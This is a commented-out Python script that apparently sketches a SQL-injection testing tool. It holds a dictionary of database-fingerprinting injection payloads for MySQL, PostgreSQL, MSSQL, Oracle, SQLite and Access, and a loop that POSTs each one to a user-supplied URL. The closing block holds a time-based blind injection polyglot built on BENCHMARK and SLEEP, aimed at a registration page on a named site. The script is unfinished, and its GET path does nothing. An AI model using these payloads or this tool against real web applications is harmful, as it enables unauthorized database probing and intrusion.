# import requests


# find_dbms_payloads = {
#     "mysql": "'); select connection_id(); --",
#     "postgresql": "'); select pg_client_encoding(); --",
#     "mssql": "'); select @@CONNECTIONS; --",
#     "oracle": "'); select RAWTOHEX('AB')=RAWTOHEX('AB'); --",
#     "sqlite": "'); select sqlite_version(); --",
#     "msacess": "'); select last_insert_rowid()>1; --"
# }

# method = input("Do you want to make a GET or POST request? (1.GET(default) or 2.POST): ")

# if(method != "2"):
#     method = "GET"
# else: 
#     method = "POST"

# print("You chose " + method + " method.")

# get_url = True
# while(get_url):
#     try: 
#         #Get the url of the target form input
#         url = input("Enter target url: ")
#         #Get the http part of url
#         subUrl = url[:4]

#         #Test if is http
#         if(not ("http" in subUrl)):
#             #If not append http://
#             url = "http://" + url

#         #Test the request
#         if(method == "GET"):
#             result  = requests.get(url)
#             #If got invalid response change the http to https
#             if(result.status_code != 200):
#                 url = "https://" + url[7:]
#                 result = requests.get(url)

#             if(result.status_code != 200):
#                 print("Could not connect to the providen url. Try again.")
#             else:
#                 print("Connection to url made successfully")
#                 get_url = False
#         else:
#             get_url = False        
#     except: 
#         print("Could not connect to the providen url. Try again.")
    
# if(method == "GET"):
#     print("GET")
# else:
#     param = input("Type the param you wish to test: ")
#     for payload in find_dbms_payloads:
#         print(find_dbms_payloads[payload])
#         data = {"email": find_dbms_payloads[payload]}
#         result = requests.post(url, data);
#         print(result)


# # data = {'userEmail':"usman@cyberpersons.com",'status':'1','password':"cyberpersons'",'findUs':'IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*\'XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\'|"XOR(IF(SUBSTR(@@version,1,1)&lt;5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/'}
# # targetURL = 'http://check.cyberpersons.com/ProjectDev/register.php'
# # result = requests.post(targetURL,data)
 
# # print result.elapsed.total_seconds()
# # print result.text
